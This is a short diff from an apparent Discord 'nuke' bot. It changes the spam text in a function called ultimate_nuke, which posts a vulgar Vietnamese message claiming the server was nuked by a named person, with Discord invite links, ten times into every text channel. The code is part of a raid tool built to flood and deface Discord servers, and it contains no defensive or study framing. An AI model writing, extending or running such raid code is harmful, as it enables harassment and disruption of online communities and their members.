@@ -917,7 +917,7 @@ async def ultimate_nuke(ctx):
         except:
             pass
 
-        spam_content = "@everyone # SEVER ÓC CẶC ĐÃ BỊ NUKE BỞI BẢO ĐZ\nlink sv: https://discord.gg/4jWeG2ag2D\nlink sv:https://discord.gg/fZhYhKdVrY"
+        spam_content = "@everyone # SEVER ÓC CẶC ĐÃ BỊ NUKE BỞI BẢO ĐZ\nlink sv: https://discord.gg/pwgw9UVvB5"
         for channel in ctx.guild.text_channels:
             try:
                 for _ in range(10):
